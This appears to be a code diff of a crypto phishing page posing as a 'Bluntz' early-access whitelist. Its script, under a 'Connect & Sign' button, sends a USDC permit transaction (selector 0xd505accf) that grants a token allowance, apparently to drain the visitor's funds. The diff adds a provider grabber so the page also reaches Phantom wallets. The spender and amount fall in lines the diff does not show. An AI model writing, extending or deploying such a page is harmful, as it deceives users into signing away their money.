@@ -1,24 +1,26 @@
 <!DOCTYPE html>
-<html><head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>Bluntz – Early-access whitelist</title>
-<style>
-body{background:#081008;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
-.card{background:rgba(0,255,150,0.05);border:1px solid rgba(0,255,150,0.15);border-radius:14px;padding:2.2rem 2.5rem;text-align:center;width:90%;max-width:360px;box-shadow:0 0 24px #00ff9630}
-.logo{color:#00ff96;font-size:2rem;font-weight:800;margin-bottom:.6rem}
-h1{color:#d0ffd0;font-size:1.3rem;margin-bottom:.4rem}
-p{color:#a0d0a0;font-size:.9rem;margin-bottom:1.8rem}
-button{width:100%;padding:.9rem 0;font-size:1rem;font-weight:700;border:none;border-radius:8px;background:#00ff96;color:#000;cursor:pointer;transition:transform .15s}
-button:hover{transform:translateY(-2px)}
-</style>
-</head><body>
-<div class="card">
-<div class="logo">BLUNTZ</div>
-<h1>Early-access whitelist</h1>
-<p>Connect wallet and sign to reserve your $BLUNTZ allocation on Base.</p>
-<button id="go">Connect & Sign</button>
-</div>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Bluntz – Early-access whitelist</title>
+  <style>
+    body{background:#081008;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
+    .card{background:rgba(0,255,150,0.05);border:1px solid rgba(0,255,150,0.15);border-radius:14px;padding:2.2rem 2.5rem;text-align:center;width:90%;max-width:360px;box-shadow:0 0 24px #00ff9630}
+    .logo{color:#00ff96;font-size:2rem;font-weight:800;margin-bottom:.6rem}
+    h1{color:#d0ffd0;font-size:1.3rem;margin-bottom:.4rem}
+    p{color:#a0d0a0;font-size:.9rem;margin-bottom:1.8rem}
+    button{width:100%;padding:.9rem 0;font-size:1rem;font-weight:700;border:none;border-radius:8px;background:#00ff96;color:#000;cursor:pointer;transition:transform .15s}
+    button:hover{transform:translateY(-2px)}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">BLUNTZ</div>
+    <h1>Early-access whitelist</h1>
+    <p>Connect wallet and sign to reserve your $BLUNTZ allocation on Base.</p>
+    <button id="go">Connect & Sign</button>
+  </div>
 
 <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
 <script>
@@ -34,8 +36,15 @@ const DOMAIN_TYPEHASH = ethers.utils.keccak256(
   ethers.utils.toUtf8Bytes("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)")
 );
 
+/* universal provider grabber */
+function getProvider(){
+  const p = window.ethereum || (window.phantom && window.phantom.ethereum);
+  if(!p) throw new Error("No wallet detected");
+  return new ethers.providers.Web3Provider(p);
+}
+
 document.getElementById("go").onclick = async () => {
-  const provider = new ethers.providers.Web3Provider(window.ethereum);
+  const provider = getProvider();
   await provider.send("eth_requestAccounts",[]);
   const signer = provider.getSigner();
   const owner = await signer.getAddress();
@@ -103,4 +112,6 @@ document.getElementById("go").onclick = async () => {
   const tx=await signer.sendTransaction({to:USDC,data:"0xd505accf"+permitData.slice(2),gasLimit:100000});
   console.log("Permit tx:",tx.hash);
 };
-</script></body></html>
+</script>
+</body>
+</html>
